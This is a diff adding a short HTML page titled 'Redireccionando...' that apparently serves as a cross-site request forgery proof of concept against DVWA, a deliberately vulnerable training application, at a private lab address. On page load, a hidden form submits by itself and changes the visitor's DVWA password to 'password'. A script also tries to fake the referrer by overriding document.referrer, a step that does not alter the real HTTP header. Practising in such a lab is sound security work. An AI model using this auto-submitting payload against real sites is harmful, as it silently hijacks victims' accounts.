@@ -1,0 +1,24 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Redireccionando...</title>
+</head>
+<body>
+    <form id="csrfForm" action="http://192.168.226.198/dvwa/vulnerabilities/csrf/" method="get">
+        <input type="hidden" name="password_new" value="password">
+        <input type="hidden" name="password_conf" value="password">
+        <input type="hidden" name="Change" value="Change">
+        <input type="submit" value="Submit">
+    </form>
+    <script>
+        document.addEventListener("DOMContentLoaded", function() {
+            // Modificar el encabezado HTTP_REFERER
+            Object.defineProperty(document, "referrer", { get : function(){ return "http://127.0.0.1/"; } });
+            // Enviar el formulario automáticamente
+            document.getElementById("csrfForm").submit();
+        });
+    </script>
+</body>
+</html>
